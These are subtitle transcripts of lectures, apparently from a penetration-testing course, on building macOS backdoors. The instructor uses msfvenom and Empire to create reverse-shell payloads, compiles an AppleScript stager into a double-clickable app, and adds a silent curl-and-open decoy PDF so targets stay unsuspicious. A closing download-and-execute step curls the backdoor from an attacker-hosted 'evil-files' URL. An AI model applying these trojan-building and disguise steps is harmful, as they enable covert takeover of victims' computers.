00:06:42,900  -->  00:06:47,240
is connected to and that's why you're seeing that I have a different IP address right now.

75

00:06:48,280  -->  00:06:49,760
So I'm going to close this now.

76

00:06:52,020  -->  00:06:58,080
And we're back at our command, so I'm gonna just set my IP to '192.168.0.34'.

77

00:06:59,500  -->  00:07:03,020
Then I'm gonna set the other required option which was the 'LPORT'

78

00:07:04,160  -->  00:07:07,540
and we're gonna set that to '4444'.

79

00:07:07,840  -->  00:07:13,620
Now by default this is actually set to'4444', if we go up in here as you can see

80

00:07:13,700  -->  00:07:18,380
but I just did it in here just to show you how to change it if you wanted to change it.

81

00:07:19,460  -->  00:07:30,540
Now I'm gonna export all of these options to a file and then I'm gonna call this backdoor 'rev_tcp_4444.py'.

82

00:07:31,900  -->  00:07:35,140
So, if you think of it, this command is very, very simple

83

00:07:35,140  -->  00:07:39,020
but I just wanted to show you how to properly use 'Msfvenom'.

84

00:07:39,780  -->  00:07:42,680
So all we have to do is just say 'msfvenom',

85

00:07:43,260  -->  00:07:49,420
we first listed the payloads and then we selected this payload so we did '--payload'

86

00:07:49,700  -->  00:07:54,240
followed by the payload that we want to use and then we set the 'LHOST',

87

00:07:54,240  -->  00:07:59,940
which is the IP that we want to receive the connections on to the IP of the Kali machine

88

00:08:00,420  -->  00:08:08,580
and we set the 'LPORT', the port to receive the connections onto 4444 and we're saving all of this

89

00:08:08,580  -->  00:08:12,940
to a file called  'rev_tcp_4444.py'.

90

00:08:14,040  -->  00:08:20,100
I'm gonna hit 'Enter' and that's gonna generate the payload for me and store it in that file.

91

00:08:20,660  -->  00:08:23,960
Now I'm gonna copy this file to my 'evil-files' from terminal.

92

00:08:24,320  -->  00:08:36,200
So all I have to do is just do 'cp rev_tcp_4444.py' and we're gonna copy this to 'var/www/evil-files/'.

93

00:08:37,740  -->  00:08:39,380
Okay, now we're all done.

94

00:08:39,380  -->  00:08:41,920
Now in order to be able to receive the connection,

95

00:08:41,920  -->  00:08:45,780
we have to listen for incoming connections using the multi handler.

96

00:08:46,480  -->  00:08:50,840
Now I've showed you how to do that before and I spent a whole lecture on it,

97

00:08:50,840  -->  00:08:55,960
so at the moment I'm gonna do it quickly and if you don't really understand what's happening,

98

00:08:55,960  -->  00:08:59,820
please go back to the listening for incoming connections lecture.

99

00:09:00,740  -->  00:09:04,120
So right now, I'm already inside my exploit multi handler.

100

00:09:04,120  -->  00:09:08,420
If you weren't inside it then you have to do 'use exploit multi handler'

101

00:09:09,040  -->  00:09:10,740
then I'm gonna set the payload.

102

00:09:12,580  -->  00:09:16,780
And make sure you set the payload to the same payload that you used in the backdoor.

103

00:09:17,280  -->  00:09:20,800
So in my case it was 'python/meterpreter/reverse_tcp'.

104

00:09:21,840  -->  00:09:26,840
I'm gonna set the 'LPORT' to '4444'

105

00:09:27,720  -->  00:09:32,400
and if I do show options, just so that you can see everything,

106

00:09:32,400  -->  00:09:38,160
you'll see that I'm using 'python/meterpreter/reverse_tcp', my 'LHOST'

107

00:09:38,160  -->  00:09:41,620
and my 'LPORT ' and all of it is set properly.

108

00:09:42,740  -->  00:09:43,450
So we're ready.

109

00:09:43,450  -->  00:09:47,300
Now I'm gonna do 'exploit' to wait for incoming connections

110

00:09:48,380  -->  00:09:52,560
then we'll go to the OS X machine and test the backdoor.

111

00:09:53,360  -->  00:10:08,500
So we're gonna go to '192.168.0.34/evil-files' and my backdoor is called  'rev_tcp_4444.py'.

112

00:10:09,600  -->  00:10:16,160
I'm gonna save that and that's gone in my downloads right now.

113

00:10:17,440  -->  00:10:21,960
Now we can't actually double-click this, if we double click it, it'll either open in a text editor

114

00:10:21,960  -->  00:10:25,300
or it'll ask us to pick a program to run it.

115

00:10:25,760  -->  00:10:30,160
So like I said, right now we're just having a look on a very basic back door

116

00:10:30,480  -->  00:10:35,320
but we'll work on this in future lectures and we're gonna make it work using a double click

117

00:10:35,320  -->  00:10:37,560
and we're gonna make it look like any other file type.

118

00:10:38,400  -->  00:10:42,220
For now we're just testing the back door, so we're gonna test it from the terminal.

119

00:10:45,940  -->  00:10:48,360
I'm gonna go to downloads...

120

00:10:51,660  -->  00:10:55,060
and if I 'ls', you'll see I have my backdoor right here.

121

00:10:55,800  -->  00:11:04,120
So since this is written in Python we can execute it by typing 'python' followed by the file name.

122

00:11:04,120  -->  00:11:07,060
So this is the way to execute any Python script.

123

00:11:07,500  -->  00:11:12,260
You type in Python followed by the name of the file that you want to execute.

124

00:11:13,240  -->  00:11:18,300
I'm gonna hit 'Enter' and if we go back to the Kali machine,

125

00:11:18,380  -->  00:11:24,960
you'll see that I got a reverse meterpreter connection from the mac OS X machine.

126

00:11:25,920  -->  00:11:31,620
So if I just do 'sysinfo', you'll see that I'm inside that machine

127

00:11:31,620  -->  00:11:37,600
and right now I basically have full access and full control over that machine.

128

00:11:38,360  -->  00:11:40,285
Now I know this method isn't very smart,

129

00:11:40,285  -->  00:11:44,360
you can't really ask the target person to execute your backdoor from terminal

130

00:11:44,780  -->  00:11:48,540
but right now we'll just have a look on a very basic backdoor

131

00:11:48,540  -->  00:11:53,720
and in future videos, we'll be modifying this and create Trojans out of this

132

00:11:54,120  -->  00:11:59,260
so that we can make our backdoors look and function just like any other file type,

133

00:11:59,260  -->  00:12:03,480
like an image, a PDF or anything that the target person trusts.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1

00:00:01,860  -->  00:00:06,980
In this lecture, I'm gonna show you how to create an OS X back door using Empire.

2

00:00:08,300  -->  00:00:11,680
I'm skipping how to create a back door using TheFatRat

3

00:00:11,960  -->  00:00:18,860
because using it is very, very simple. All you have to do is just select the option to create an OS X backdoor

4

00:00:19,140  -->  00:00:21,160
and it's gonna walk you through the steps,

5

00:00:21,380  -->  00:00:23,780
so using it is very, very similar to Windows

6

00:00:24,040  -->  00:00:26,680
and covering it will just make the course boring.

7

00:00:27,580  -->  00:00:33,480
You'll even see now with using Empire, the steps are similar to the steps that you need to follow

8

00:00:33,620  -->  00:00:35,920
when generating a back door for Windows.

9

00:00:36,180  -->  00:00:40,580
The only difference is we need to select a stager that'll work with OS X.

10

00:00:40,960  -->  00:00:47,020
Other than that, using the tool to target OS X is very similar to using it when targeting windows.

11

00:00:47,760  -->  00:00:51,640
Now, the first thing I'm gonna do is, I'm gonna generate a new listener.

12

00:00:52,400  -->  00:00:57,320
And that doesn't mean the old listener that we were using with Windows doesn't work, it actually works.

13

00:00:57,600  -->  00:01:02,160
The only problem is or the only difference is that I'm on a different network right now,

14

00:01:02,340  -->  00:01:04,580
that's why I'm going to generate another listener.

15

00:01:05,180  -->  00:01:06,720
So if I go to listeners.

16

00:01:08,140  -->  00:01:11,240
You'll see that I have the listener that, that I used with Windows

17

00:01:11,540  -->  00:01:17,180
and we can use this listener with any other operating system, it doesn't have to be only used with Windows.

18

00:01:17,520  -->  00:01:22,000
The only thing is that it uses the IP of '10.20.14.213',

19

00:01:22,180  -->  00:01:26,580
which is the network that I was connected to when I was targeting the Windows machine,

20

00:01:27,140  -->  00:01:29,260
but right now if I do 'ifconfig'.

21

00:01:31,720  -->  00:01:39,860
You'll see that I'm connected to a different network which has an-- and my IP right now is '192.168.0.34'.

22

00:01:40,520  -->  00:01:42,880
So, I'm connected to a completely different network

23

00:01:43,100  -->  00:01:48,300
and therefore I need to either modify the IP in this listener and use it the way it is,

24

00:01:48,480  -->  00:01:49,980
or just create another listener

25

00:01:50,280  -->  00:01:51,400
and that's what I'm gonna do.

26

00:01:52,120  -->  00:01:53,740
So, I'm gonna do 'uselistener'

27

00:01:54,440  -->  00:01:58,240
and I'm gonna do 'http' because I want to use the 'http listener'.

28

00:01:58,420  -->  00:02:03,400
Now, we actually covered what's the meaning of that and how to use all the types of listeners before,

29

00:02:03,560  -->  00:02:05,920
with the Empire lecture on Windows.

30

00:02:06,280  -->  00:02:08,320
So, I'm not gonna go in detail on that.

31

00:02:08,940  -->  00:02:11,300
And then I'm going to do 'info' to see the options

32

00:02:12,060  -->  00:02:18,460
and you'll see that it automatically got my  new IP, which is '192.168.0.34'.

33

00:02:19,540  -->  00:02:25,480
You can also see that the port used now is '8088' instead of '8080'

34

00:02:25,600  -->  00:02:31,520
because I already have something listening on 8080, so I can't have two listeners listening on the same port.

35

00:02:32,040  -->  00:02:37,520
So, if you have '8080' in here and you already have a listener listening on that port,

36

00:02:37,740  -->  00:02:42,680
then you can just do 'set Port' and put the port that you wanna set

37

00:02:42,700  -->  00:02:47,300
and for now it's '8088' and I'm just going to keep it to that, so this is not going to do anything.

38

00:02:48,820  -->  00:02:50,880
Once done with that, I'm gonna do 'execute'.

39

00:02:54,680  -->  00:02:57,820
And that's it now, my listeners is running, so if I do 'list'.

40

00:02:59,180  -->  00:03:01,180
If I go 'back', sorry,

41

00:03:01,860  -->  00:03:03,260
and then do 'list'.

42

00:03:04,860  -->  00:03:08,720
You'll see that I have two listeners; one of them is listening on this IP,

43

00:03:08,720  -->  00:03:13,700
which is the one connected to a different network to the network that's Windows connected to

44

00:03:14,020  -->  00:03:20,380
and then I have the other listener that is listening on the other IP that I'm using at the moment.

45

00:03:21,160  -->  00:03:25,640
Again the listeners are generic, so there-- they work with all operating system.

46

00:03:25,880  -->  00:03:30,040
You don't have to create a listener for each operating system, you can use the same listener.

47

00:03:30,380  -->  00:03:33,720
The only thing, the only reason, I create another listener now,

48

00:03:34,100  -->  00:03:39,360
is because I'm connected to a completely different network with a different IP.

49

00:03:41,700  -->  00:03:48,560
Now, the thing that is different from operating system to another or from target to another is the 'stager'.

50

00:03:48,880  -->  00:03:52,340
So if your target is Windows, you need to use a Windows stager.

51

00:03:52,520  -->  00:03:57,380
If your target is OS X, then you need to use an OS X stager.

52

00:03:57,840  -->  00:04:00,180
The listener is the same, the stager is different

53

00:04:00,480  -->  00:04:02,960
and that's why I really like Empire

54

00:04:02,960  -->  00:04:06,180
because if our targets are all on the same
network

55

00:04:06,480  -->  00:04:09,720
or for targeting computers outside our network,

56

00:04:10,020  -->  00:04:11,800
then all we need is only one listener.

57

00:04:12,260  -->  00:04:16,100
And it doesn't matter what operating system our, our target uses.

58

00:04:16,200  -->  00:04:21,380
so we create one listener, listening on our public IP and more on that later.

59

00:04:22,060  -->  00:04:26,000
And then create different stages for the different operating systems.

60

00:04:26,920  -->  00:04:32,560
Now, targeting computers on different networks on the internet, will be covered later on in the course.

61

00:04:33,600  -->  00:04:35,840
For now, I'm gonna use a 'stager'.

62

00:04:37,960  -->  00:04:41,840
And I'm gonna do double-tap to see all the stages that I can use

63

00:04:42,220  -->  00:04:45,220
and before, we use the Windows stager the 'launcher_bat'.

64

00:04:45,940  -->  00:04:49,320
For now, you can see all the OS X stagers that we can use

65

00:04:49,860  -->  00:04:55,040
and these are basically, the back doors that you can use and send to the target computer.

66

00:04:55,820  -->  00:05:01,440
Some of these will allow you to create a 'safari launcher', some of them will allow you to create a 'macho',

67

00:05:01,440  -->  00:05:04,220
which is basically, an 'exe' for OS X,

68

00:05:04,720  -->  00:05:07,040
some of them will allow you to create a 'jar',

69

00:05:07,960  -->  00:05:11,260
the one that I like the most is the 'applescript'.

70

00:05:14,300  -->  00:05:15,660
We're gonna do 'info'

71

00:05:16,700  -->  00:05:19,400
and the first thing that you'd wanna set, is the Listener.

72

00:05:19,440  -->  00:05:22,020
Now I've already set this because I tested this before

73

00:05:22,140  -->  00:05:24,240
but in your case, you'll have to set this.

74

00:05:24,440  -->  00:05:26,600
So, I'm just gonna do it to show you how to do it.

75

00:05:26,600  -->  00:05:30,580
So we're just gonna do 'set Listener http1',

76

00:05:30,880  -->  00:05:35,040
again we're setting the options exactly the same way that we did when we were targeting,

77

00:05:35,400  -->  00:05:38,140
when we are creating a stager for Windows

78

00:05:39,220  -->  00:05:40,940
and you want to also set the 'Out file'.

79

00:05:41,620  -->  00:05:45,600
And this is the location where the backdoor is going to be stored

80

00:05:45,880  -->  00:05:50,680
and I'm gonna store it in 'var/www/html/evil-files'

81

00:05:50,900  -->  00:05:55,340
and I'm gonna call it 'osx_http_8088',

82

00:05:56,860  -->  00:05:59,500
that's it, we're ready to go, I'm gonna do 'execute'.

83

00:06:01,760  -->  00:06:08,880
And that stored the backdoor for me in 'var/www/html evil-files/osx_http_8088'.

84

00:06:09,900  -->  00:06:16,500
Now, you can just go ahead and download this backdoor and execute it from the OS X terminal

85

00:06:16,680  -->  00:06:20,460
and it's gonna work and it will give you full control over that computer.

86

00:06:21,400  -->  00:06:26,840
I don't think that's a very good idea because most OS X users are used to double-click the files.

87

00:06:27,300  -->  00:06:31,680
So in this next lecture, I'm going to show you how to convert this script to an executable

88

00:06:31,940  -->  00:06:33,900
and then we'll test it and see how it works.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1

00:00:01,380  -->  00:00:09,160
So, now I have my backdoor stored in var/www/html/evil-files and this is an Apple script.

2

00:00:09,460  -->  00:00:14,740
So for this to work, the target has to download it and run it from their terminal.

3

00:00:15,540  -->  00:00:20,500
So what I wanna show you today, is how to convert that script to an executable.

4

00:00:20,700  -->  00:00:27,140
So when the target double clicks it, it'll be executed and it will give you full control over that computer.

5

00:00:28,160  -->  00:00:32,580
So I'm gonna go to my target machine and I'm gonna go to my IP

6

00:00:32,800  -->  00:00:35,940
and remember now I'm on a different network and my IP is different.

7

00:00:35,940  -->  00:00:40,720
My IP is 192.168.0.34.

8

00:00:41,200  -->  00:00:42,820
And I'm gonna go through evil files

9

00:00:46,960  -->  00:00:52,040
And you can see we have our backdoor in here osx_http_8088.

10

00:00:52,860  -->  00:00:54,080
I'm gonna click on that.

11

00:00:56,160  -->  00:00:59,080
Now, as you can see the file gets opened as a script.

12

00:00:59,520  -->  00:01:05,600
And again, this has to be stored in a file and then the file has to be executed from terminal for this to work.

13

00:01:06,100  -->  00:01:08,800
And I don't think this is a good idea, like I said.

14

00:01:09,100  -->  00:01:11,840
So I'm gonna show you how to compile this into an executable.

15

00:01:12,880  -->  00:01:19,560
First, I'm gonna copy all of this and then I'm gonna open an application.

16

00:01:19,560  -->  00:01:24,740
I'm gonna go to my Launchpad and open an application called Script Edit.

17

00:01:24,920  -->  00:01:28,820
So if you just type in 'edit' you'll see it and we have here Script Editor.

18

00:01:29,560  -->  00:01:30,580
I'm gonna click on that.

19

00:01:31,920  -->  00:01:40,080
I'm gonna paste everything in here and then we're gonna go to File &gt; Export.

20

00:01:42,780  -->  00:01:46,960
We're gonna set the name and let's set the name to Basic Backdoor.

21

00:01:49,360  -->  00:01:51,400
We're gonna export it in the downloads

22

00:01:52,580  -->  00:01:58,000
and the most important thing is to set the file format to application.

23

00:01:58,200  -->  00:02:02,820
So it set the script, change that to Application and save it

24

00:02:03,920  -->  00:02:04,760
and that's it.

25

00:02:04,765  -->  00:02:07,480
Now the backdoor is ready to be used and sent

26

00:02:07,580  -->  00:02:10,460
using the delivery methods that we're gonna talk about later

27

00:02:11,100  -->  00:02:12,640
but for now, let's test it.

28

00:02:12,740  -->  00:02:15,860
I'm gonna go to my finder and go to downloads

29

00:02:17,720  -->  00:02:19,940
and you can see that I have my Basic Backdoor.

30

00:02:20,840  -->  00:02:23,100
Now, we're not gonna run this from the terminal.

31

00:02:23,460  -->  00:02:25,060
We're actually just gonna double click it.

32

00:02:27,020  -->  00:02:28,960
Now, if we go back to the Kaili machine,

33

00:02:31,160  -->  00:02:34,740
you'll see that we got a connection from our agent

34

00:02:35,760  -->  00:02:40,180
and we can interact with that, the same way that we used and interact with our Windows agents.

35

00:02:42,160  -->  00:02:43,640
And then we can do 'sysinfo'

36

00:02:45,560  -->  00:02:50,040
and as you can see we have, we managed to gain access to that computer.

37

00:02:50,460  -->  00:02:53,920
The name of the computer is zOOz's Mac, the user is zOOz.

38

00:02:54,320  -->  00:03:00,580
You can see the listener, the IP and the information about the current operating system.

39

00:03:01,320  -->  00:03:04,440
And we basically have full control over that Mac OS machine.

40

00:03:05,260  -->  00:03:09,580
Now, like I said, using the access that we gained using this agent

41

00:03:09,860  -->  00:03:12,420
will be covered in the post exploitation section

42

00:03:13,260  -->  00:03:18,620
but I should say using the agent and controlling the target computer is very similar,

43

00:03:18,620  -->  00:03:22,160
whether the target is Windows, Mac OS or Linux.

44

00:03:22,580  -->  00:03:27,660
So that's why I wanna show you how to hack and gain access to all of these computers first

45

00:03:27,900  -->  00:03:33,000
and then we're going to see how to use the access that we gained in the post exploitation section.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1

00:00:01,080  -->  00:00:04,860
Now, in this lecture I wanna show you how to enhance the backdoor

2

00:00:04,860  -->  00:00:06,720
that we created in the previous video

3

00:00:07,260  -->  00:00:11,320
and we'll see how we can combine this backdoor with any file,

4

00:00:11,320  -->  00:00:16,716
so that the target person, when they execute it, they'll see a PDF or an image or a song.

5

00:00:17,060  -->  00:00:18,980
So that they won't be too suspicious.

6

00:00:20,020  -->  00:00:24,260
Doing this is really simple since Mac computers are based on Unix

7

00:00:24,700  -->  00:00:27,700
and we can run Unix commands on these systems.

8

00:00:28,460  -->  00:00:32,900
So basically, I'm gonna be relying on three very simple commands

9

00:00:33,320  -->  00:00:36,200
to make my backdoor look like any other file type

10

00:00:37,160  -->  00:00:39,800
and before I show you how to integrate this in the backdoor,

11

00:00:40,240  -->  00:00:42,320
I wanna show you the commands that I'm gonna use

12

00:00:42,320  -->  00:00:48,500
because getting used to Linux commands is really handy if you're serious about becoming a pen tester.

13

00:00:49,020  -->  00:00:55,960
So these commands will work on Mac OS X and on Linux computers and even on iOS and Android

14

00:00:56,260  -->  00:01:02,100
because all of these systems use bash and the commands that I show you are bash commands.

15

00:01:03,480  -->  00:01:08,580
So the first thing that you wanna do is go to the launcher and launch our terminal.

16

00:01:11,300  -->  00:01:16,100
Now, like I said what I'm gonna do now, is not really mandatory for making the backdoor.

17

00:01:16,260  -->  00:01:20,760
I'm only doing this to show you the commands that we're gonna use inside the backdoor.

18

00:01:21,820  -->  00:01:25,500
So the first command that I wanna show you is a command that you already know.

19

00:01:25,720  -->  00:01:26,620
And it's the cd command

20

00:01:27,260  -->  00:01:31,040
and that command as we know, will take you to a different working directory.

21

00:01:31,920  -->  00:01:34,240
So when we're downloading files from the internet

22

00:01:34,240  -->  00:01:39,020
because we're gonna be downloading the PDF or the image from the internet.

23

00:01:39,360  -->  00:01:43,540
So we don't want it to be downloaded on a directory that the target person will see

24

00:01:43,540  -->  00:01:44,920
and then they'll get suspicious.

25

00:01:45,460  -->  00:01:52,940
So a good idea is to download it in the default temporary directory, which is /tmp.

26

00:01:53,760  -->  00:01:57,520
So the first thing that we wanna do with that script is just do 'cd /tmp'

27

00:01:58,440  -->  00:02:01,060
and that will take us to the tmp directory.

28

00:02:03,000  -->  00:02:06,600
Then the next thing that we wanna do is we want to download our file.

29

00:02:07,020  -->  00:02:13,060
That's the file that is gonna be displayed to the target person when they run our backdoor.

30

00:02:13,940  -->  00:02:19,340
So this can be an image, this can be a song, this can be a video, whatever you want really.

31

00:02:20,120  -->  00:02:24,400
I'm gonna do this example on the PDF file that we did with Windows as well

32

00:02:24,580  -->  00:02:28,320
just because it's already uploaded on a direct URL.

33

00:02:29,460  -->  00:02:31,560
So I'm just gonna look for sample PDF.

34

00:02:34,080  -->  00:02:38,985
So in a real case scenario, you can just upload the file that you want the person to download

35

00:02:38,985  -->  00:02:43,500
to a free web hosting or hosted on your own web server

36

00:02:43,580  -->  00:02:48,500
and then enable port forwarding the same way that I'm gonna show you later on in the course.

37

00:02:48,980  -->  00:02:51,960
For now, I'm gonna use this URL right here

38

00:02:52,280  -->  00:02:57,860
and as you can see this is a direct URL to the PDF and it opens the PDF directly for us.

39

00:02:58,380  -->  00:03:00,480
So this is really good, I'm gonna copy this.

40

00:03:02,640  -->  00:03:05,840
And now, we need to be able to download this file

41

00:03:06,560  -->  00:03:09,520
and to do that we're going to use a command called cURL.

42

00:03:09,900  -->  00:03:16,080
So it's 'curl' followed by the URL that we want to download

43

00:03:17,200  -->  00:03:19,700
and followed by - capital O.

44

00:03:19,720  -->  00:03:21,800
This is a capital O, not a small letter.

45

00:03:22,320  -->  00:03:30,080
The whole point of having -O in here is to tell cURL to save whatever that's in this URL on disk.

46

00:03:30,620  -->  00:03:33,260
So cURL will go ahead, will open this URL.

47

00:03:33,260  -->  00:03:39,880
It will see that there is a PDF file and it will store that in tmp because we did 'cd/ tmp' before.

48

00:03:40,940  -->  00:03:43,260
I'm also gonna add -s to this.

49

00:03:43,500  -->  00:03:46,360
So that it's silent, It doesn't show any other output.

50

00:03:46,360  -->  00:03:49,980
It will literally just download the file and not say anything.

51

00:03:50,340  -->  00:03:53,500
So I'm gonna hit Enter and you'll see we won't get any output.

52

00:03:53,500  -->  00:03:56,360
This is literally just going to download the file on disk

53

00:03:56,560  -->  00:04:02,440
and now the file is in tmp and if you wanna confirm this, you can just do 'ls' like we did before.

54

00:04:02,780  -->  00:04:07,360
That will list the existing files and you'll see that we have the pdf.pdf downloaded.

55

00:04:09,720  -->  00:04:13,880
The last thing that we wanna do is after we download the file is we want to open this file.

56

00:04:14,480  -->  00:04:19,640
So we're gonna do open, the name of the file, which is pdf.pdf

57

00:04:23,780  -->  00:04:24,760
and here we go.

58

00:04:25,100  -->  00:04:28,040
We open this file inside the Mac from terminal.

59

00:04:28,500  -->  00:04:34,100
So we first go to temp then we download the file that we want using cURL

60

00:04:34,640  -->  00:04:36,540
and then we open the file using open.

61

00:04:37,000  -->  00:04:38,080
Very, very simple.

62

00:04:38,840  -->  00:04:45,040
Now, we can do all of this in one line in one command and we're gonna use the ampersand to do that.

63

00:04:46,040  -->  00:04:47,900
So first I'm just gonna remove this PDF.

64

00:04:48,020  -->  00:04:55,520
So we can do this again and I'm just gonna do 'rm -r pdf.pdf' that will just remove the file for me.

65

00:04:55,700  -->  00:04:59,015
So if I do 'ls' there is nothing and now, what I'm gonna do,

66

00:04:59,660  -->  00:05:02,260
I'm gonna go back to my home directory actually

67

00:05:05,480  -->  00:05:09,360
and what I'm gonna do now is, I'm gonna combine the three commands that we did.

68

00:05:09,880  -->  00:05:11,720
So the first thing, we're gonna do 'cd /tmp'.

69

00:05:15,220  -->  00:05:20,120
Then I can combine this one with another command by literally putting two ampersands.

70

00:05:20,980  -->  00:05:23,960
Then we're gonna do the cURL command to download the file

71

00:05:25,540  -->  00:05:31,840
and we're gonna do '-O -s' then two
ampersands again.

72

00:05:32,220  -->  00:05:35,760
And then we'll put the last command, which is the open command.

73

00:05:35,920  -->  00:05:37,740
And that's gonna open the PDF for me.

74

00:05:37,860  -->  00:05:40,940
So that's going to be 'open pdf.pdf'.

75

00:05:44,480  -->  00:05:47,820
So we literally in here, all we did is we combined the three commands.

76

00:05:47,820  -->  00:05:53,620
We're gonna do the 'cd' to go to the tn, to the temporary directory then we're gonna download the file

77

00:05:53,840  -->  00:05:55,060
and then we're gonna open it.

78

00:05:56,420  -->  00:05:57,420
I'm gonna hit Enter

79

00:05:59,260  -->  00:06:03,940
and as you can see automatically, we downloaded the file and opened it.

80

00:06:04,240  -->  00:06:10,960
And right now, if I close this and do 'ls', you'll see that I'm actually in the temp directory,

81

00:06:11,160  -->  00:06:12,620
whereas I was in the home directory.

82

00:06:12,620  -->  00:06:17,560
So it automatically downloaded this for me in the temp, not in the home directory.

83

00:06:19,200  -->  00:06:20,160
Now this is perfect .

84

00:06:20,460  -->  00:06:25,940
Now, all we have to do is literally copy this one line that we made and then paste it in our script.

85

00:06:26,620  -->  00:06:29,260
Before I do that though, I'm gonna remove the PDF.

86

00:06:30,720  -->  00:06:35,260
Just so that we can download it again and run it.

87

00:06:35,420  -->  00:06:38,160
So that you'll know that I didn't download it from the terminal

88

00:06:38,420  -->  00:06:40,120
and it's getting downloaded from the script.

89

00:06:41,940  -->  00:06:46,820
So the command that we're gonna be copying is the command that we just constructed.

90

00:06:47,320  -->  00:06:52,540
I wanted to show you how to construct it, so that you can actually test it before you do anything.

91

00:06:53,900  -->  00:06:59,120
So the first thing that I want to do now is to copy my backdoor code

92

00:06:59,120  -->  00:07:01,260
that we used in the previous video, this one

93

00:07:01,660  -->  00:07:04,680
and I'm gonna open my Script Editor, like we did last time

94

00:07:05,540  -->  00:07:07,600
and I'm gonna paste my code in here.

95

00:07:08,760  -->  00:07:13,580
And then I'm gonna add the code that we just constructed in here.

96

00:07:14,100  -->  00:07:17,100
So I'm gonna copy that from here, from my terminal

97

00:07:18,780  -->  00:07:22,140
and in here I'm gonna, you can see my echo

98

00:07:22,480  -->  00:07:27,360
and this is the command that they're using to pipe everything to Python

99

00:07:27,360  -->  00:07:28,920
and then execute the backdoor.

100

00:07:29,380  -->  00:07:30,860
So we don't wanna mess with this.

101

00:07:31,160  -->  00:07:39,220
So I'm gonna put a semicolon and then put my code that I just constructed before this semicolon.

102

00:07:39,240  -->  00:07:43,660
So I have the semicolon there and I have my mouse in here

103

00:07:44,360  -->  00:07:49,420
and then I'm gonna paste this using command V before the semicolon.

104

00:07:49,420  -->  00:07:51,400
So we don't mess with all of this.

105

00:07:51,400  -->  00:07:52,500
We leave this the same.

106

00:07:52,860  -->  00:07:54,320
We put the semicolon in here

107

00:07:54,880  -->  00:07:56,780
and then before it, we put our code.

108

00:07:56,780  -->  00:08:02,180
So our code is going to do 'cd/ tmp' then it's going to curl the file that we want to show

109

00:08:02,520  -->  00:08:05,680
and then we're going to open the file that we just downloaded.

110

00:08:07,660  -->  00:08:12,220
Now before you export this as a file, you can actually test this script in here.

111

00:08:12,220  -->  00:08:17,400
So you can just hit the play button and it'll actually execute this script for you.

112

00:08:17,740  -->  00:08:22,260
So that you you're sure that this is gonna work and then you can send it to your target.

113

00:08:22,780  -->  00:08:26,400
So I have my Empire in here waiting for connections

114

00:08:27,460  -->  00:08:30,320
and I'm just gonna click on the play button to see what's gonna happen.

115

00:08:33,180  -->  00:08:36,640
Now, you can see we got the file that the target person is expecting.

116

00:08:36,740  -->  00:08:37,940
So this is very good.

117

00:08:38,220  -->  00:08:43,560
Now if we go to Empire, you'll see that we got a connection that we can interact with

118

00:08:45,880  -->  00:08:48,840
and then we can do 'sysinfo' just to confirm that everything is working

119

00:08:48,880  -->  00:08:50,700
and we can actually interact with the target

120

00:08:51,880  -->  00:08:54,920
and as you can see we're inside the target computer.

121

00:08:54,920  -->  00:08:58,740
We have full access to it and we can control it and do whatever we want.

122

00:09:00,100  -->  00:09:04,400
And like I said, instead of using a PDF you can use any file types

123

00:09:04,400  -->  00:09:06,740
that you think the target person is interested in.

124

00:09:07,040  -->  00:09:10,820
You can use a song a video, a picture, anything you want really.

125

00:09:11,600  -->  00:09:17,160
In the next lectures, you'll learn how to convert this to an app and how to change its icon.

126

00:09:17,160  -->  00:09:20,000
So that it looks like any other file type.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1

00:00:00,800  -->  00:00:08,060
In the previous lecture we've seen how we can make our Empire backdoor function just like any other file type

2

00:00:08,300  -->  00:00:15,540
and we had an example of making it open a PDF and at the same time our backdoor worked in the background.

3

00:00:17,140  -->  00:00:19,940
Before I show you how to package this and change its icon

4

00:00:19,940  -->  00:00:22,640
and make it look like the file that you're spoofing,

5

00:00:22,640  -->  00:00:28,360
I want to show you how to modify this code so that we have a download and execute payload.

6

00:00:29,120  -->  00:00:33,520
A download and execute payload would be very useful because you can use it

7

00:00:33,520  -->  00:00:37,860
to deliver any file that you want to the target person as a Trojan.

8

00:00:38,340  -->  00:00:43,440
So the method that I showed you in the previous lecture will only allow you to deliver Empire backdoors,

9

00:00:43,740  -->  00:00:47,920
but if we modify this code and use a download and execute payload,

10

00:00:47,920  -->  00:00:51,060
then we can deliver any file that we want to the target

11

00:00:51,220  -->  00:00:56,480
and as an example, I'm going to be delivering the 'Python meterpreter payload' that we made before.

12

00:00:58,100  -->  00:01:02,620
So to change this to a download and execute payload it's really, really easy.

13

00:01:02,900  -->  00:01:07,600
In the previous lecture, we used these three commands to download

14

00:01:07,600  -->  00:01:09,600
and execute something on the target.

15

00:01:09,940  -->  00:01:16,440
So it first went to the temp directory using the 'cd' command, then we use 'cURL' to download a file

16

00:01:17,040  -->  00:01:20,720
and then we use 'open' to open that file.

17

00:01:21,180  -->  00:01:25,380
So we're going to keep these three commands because they do something that's really cool,

18

00:01:25,380  -->  00:01:29,320
which is they download the file that the target person expects, so I'm keeping them

19

00:01:29,720  -->  00:01:34,060
and then I'm going to delete everything that comes after the semicolon here.

20

00:01:34,600  -->  00:01:39,100
So I'm just going to delete all of this up to the quotation marks here.

21

00:01:41,000  -->  00:01:46,740
Okay, so what we have now is where the script is going to open 'tmp'

22

00:01:47,100  -->  00:01:49,260
then it's going to download my PDF

23

00:01:49,760  -->  00:01:53,240
and then we're going to open the PDF and we explained all of these commands

24

00:01:53,240  -->  00:01:55,860
and we explained how to test them on your terminal.

25

00:01:56,640  -->  00:02:00,020
So, at this point the target person is gonna see the PDF

26

00:02:00,020  -->  00:02:02,680
or the image or the song that they're expecting.

27

00:02:03,440  -->  00:02:08,920
Now, the comma here means that, that command ended and we're going to be running a new command.

28

00:02:09,520  -->  00:02:14,540
So, after opening the file that the target person expects we want to download our backdoor

29

00:02:14,840  -->  00:02:18,140
and we're going to do that using the cURL command so we're going to do curl

30

00:02:19,700  -->  00:02:24,380
followed by the URL where the backdoor is stored and our backdoor is stored in

31

00:02:24,380  -->  00:02:35,500
http://192.168.0.34/evil-files and it's called rev_tcp444.py.

32

00:02:37,300  -->  00:02:42,520
Remember, this has to be a direct URL, so it should allow you to download the file

33

00:02:42,520  -->  00:02:45,700
with no ads, no HTML nothing around it.

34

00:02:45,960  -->  00:02:47,780
So, if I go to my browser

35

00:02:49,100  -->  00:02:56,800
and paste the URL, you'll see that it allows me to directly download the file without any HTML.

36

